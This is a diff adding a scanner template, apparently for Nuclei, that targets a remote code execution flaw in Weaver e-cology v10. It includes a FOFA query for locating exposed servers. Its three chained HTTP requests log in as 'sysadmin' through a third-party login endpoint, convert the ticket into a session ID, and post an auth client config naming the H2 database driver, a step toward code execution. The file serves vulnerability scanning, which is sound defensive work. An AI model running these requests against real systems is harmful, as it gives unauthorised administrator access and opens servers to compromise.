@@ -1,0 +1,71 @@
+id: e-cology-v10-rce
+
+info:
+  tags: e-cology-v10-rce
+  name: e-cology-v10-rce存在RCE
+  author: xinghe
+  severity: high
+  description: |-
+    fofa: body="/build/passport/static/js/lib.js" || body="/build/ecodesdk/static/js/lib.js"||icon_hash="-1619753057"
+
+requests:
+  - raw:
+      - |
+        POST /papi/passport/rest/appThirdLogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 51
+
+        username=sysadmin&service=1&ip=1&loginType=third
+
+
+      - |
+        POST /papi/passport/login/generateEteamsId HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 56
+        
+        stTicket={{serviceTicketId}}
+
+      - |
+        POST /api/bs/iaauthclient/base/save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 86
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Type: application/json
+        Accept: */*
+        Origin: http://ip
+        Referer: http://ip/
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        ETEAMSID: {{data}}
+
+        {"isUse":1,"auth_type":"custom","iaAuthclientCustomDTO":{"ruleClass":"org.h2.Driver"}}
+    extractors:
+       - type: regex 
+         part: body
+         name: serviceTicketId
+         group: 1
+         regex:
+            - '"serviceTicketId":"(ST-[^"]+)"'
+         internal: true
+
+       - type: regex
+         part: body
+         name: data
+         group: 1
+         regex:
+            - '"data":"([^"]+)"'
+         internal: true        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '请检查！'
+      - type: status
+        status: 
+          - 200
